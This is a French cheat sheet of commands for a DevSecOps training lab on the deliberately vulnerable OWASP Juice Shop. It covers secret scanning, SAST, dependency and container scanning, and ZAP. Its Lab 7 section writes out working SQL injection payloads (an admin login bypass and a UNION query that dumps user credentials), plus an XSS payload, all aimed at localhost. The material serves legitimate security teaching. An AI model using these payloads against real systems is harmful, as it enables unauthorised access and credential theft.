# ⌨️ Aide-mémoire des commandes

Toutes les commandes de la journée, regroupées. À garder ouvert pendant les labs.

> 📍 Sauf indication contraire, lancez ces commandes **à la racine du dépôt Juice Shop**
> (`cd ~/juice-shop` — adaptez au chemin de VOTRE clone).

---

## 🔧 Lab 0 — Environnement

```bash
# Vérifier les outils
docker --version && node --version && gitleaks version && semgrep --version && trivy --version

# Tout préparer en une commande
./formation-devsecops/scripts/setup.sh

# Démarrer Juice Shop à la main
docker pull bkimminich/juice-shop:v20.2.0
docker run -d --name juice-shop -p 3000:3000 bkimminich/juice-shop:v20.2.0
docker logs -f juice-shop          # attendre "Server listening on port 3000"

# Gérer le conteneur
docker ps                          # voir ce qui tourne
docker rm -f juice-shop            # supprimer / repartir de zéro

# App : http://localhost:3000   |   Score Board : http://localhost:3000/#/score-board
```

---

## 🔑 Lab 1 — Secrets (Gitleaks)

```bash
# Scanner le dossier
gitleaks dir . --no-banner --redact --report-format json --report-path gitleaks-rapport.json

# Compter par type de règle
python3 -c "import json,collections; d=json.load(open('gitleaks-rapport.json')); print(collections.Counter(x['RuleID'] for x in d))"

# Scanner avec une allowlist (config .gitleaks.toml)
gitleaks dir . --no-banner --redact -c .gitleaks.toml

# Scanner l'historique Git complet
gitleaks git . --no-banner --redact
```

---

## 🔎 Lab 2 — SAST (Semgrep)

```bash
# Scan du code serveur
semgrep scan --config p/javascript --config p/typescript --config p/nodejs \
  --exclude test --exclude data/static/codefixes --exclude frontend/src/assets \
  --metrics=off routes lib server.ts app.ts models

# Cibler un seul fichier
semgrep scan --config p/nodejs --metrics=off routes/login.ts

# Rapport SARIF (pour la CI / GitHub Security)
semgrep scan --config p/owasp-top-ten --sarif --output semgrep.sarif --metrics=off routes lib

# Voir la ligne vulnérable
sed -n '34p' routes/login.ts
```

---

## 📦 Lab 3 — Dépendances / SCA (Trivy)

```bash
# Scanner les sources (peu de résultats ici : pas de lockfile !)
trivy fs --scanners vuln --severity CRITICAL,HIGH .

# Scanner les bibliothèques applicatives DANS l'image
trivy image --scanners vuln --pkg-types library --severity CRITICAL,HIGH bkimminich/juice-shop:v20.2.0

# Ne garder que les failles corrigeables
trivy image --scanners vuln --pkg-types library --severity CRITICAL,HIGH --ignore-unfixed bkimminich/juice-shop:v20.2.0

# Générer puis re-scanner un SBOM
trivy image --format cyclonedx --output sbom.json bkimminich/juice-shop:v20.2.0
trivy sbom sbom.json --severity CRITICAL,HIGH
```

---

## 🐳 Lab 4 — Conteneur (Trivy)

```bash
# Failles du système d'exploitation de l'image
trivy image --scanners vuln --pkg-types os bkimminich/juice-shop:v20.2.0

# Vue complète + GATE (échoue si CVE critique corrigeable)
trivy image --severity CRITICAL,HIGH --exit-code 1 --ignore-unfixed bkimminich/juice-shop:v20.2.0

# Auditer le Dockerfile (bonnes pratiques)
trivy config Dockerfile
grep -nE 'FROM|USER|COPY --chown' Dockerfile
```

---

## 🏗️ Lab 5 — IaC (Trivy config)

```bash
# Scanner le Terraform (⚠️ volontairement vulnérable — ne pas déployer)
trivy config --severity CRITICAL,HIGH infrastructure

# GATE
trivy config --severity CRITICAL,HIGH --exit-code 1 infrastructure

# Retrouver la clé privée en dur
grep -n "BEGIN RSA PRIVATE KEY" infrastructure/terraform/networking.tf
```

---

## 🕷️ Lab 6 — DAST (OWASP ZAP)

```bash
# Scan baseline (passif, sûr) — depuis un dossier où écrire le rapport
docker run --rm --network host -v "$(pwd):/zap/wrk:rw" \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t http://localhost:3000 -r zap-report.html

# Ouvrir le rapport
xdg-open zap-report.html

# Scan actif (⚠️ envoie de vraies attaques — app de test uniquement)
docker run --rm --network host -v "$(pwd):/zap/wrk:rw" \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py -t http://localhost:3000 -r zap-full-report.html
```

---

## 💥 Lab 7 — Exploitation

```bash
# Injection SQL — bypass login admin (ligne de commande)
curl -s -X POST http://localhost:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op'"'"'--","password":"x"}'

# Injection SQL — vol des comptes (UNION)
curl -s -G "http://localhost:3000/rest/products/search" \
  --data-urlencode "q=qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"
```

Dans le **navigateur** :
- SQLi login → champ Email : `admin@juice-sh.op'--`
- XSS → barre de recherche : `<iframe src="javascript:alert(\`xss\`)">`
- Broken Access Control → URL : `http://localhost:3000/#/administration`

---

## 🚦 Lab 8 — Pipeline

```bash
# Rejouer toute la chaîne de scans en local
./formation-devsecops/scripts/run-all-scans.sh

# Nettoyer l'environnement en fin de journée
./formation-devsecops/scripts/cleanup.sh
```

---

## 🆘 Dépannage express

| Symptôme | Commande |
|----------|----------|
| Port 3000 occupé | `docker run -d --name juice-shop -p 3001:3000 bkimminich/juice-shop:v20.2.0` |
| Voir les logs de l'app | `docker logs juice-shop` |
| Repartir de zéro | `docker rm -f juice-shop` puis relancer |
| Base de CVE Trivy à jour | `trivy image --download-db-only` |
| ZAP « exit code 2 » | **Normal** : ZAP a trouvé des alertes (WARN). Ce n'est pas une erreur. |
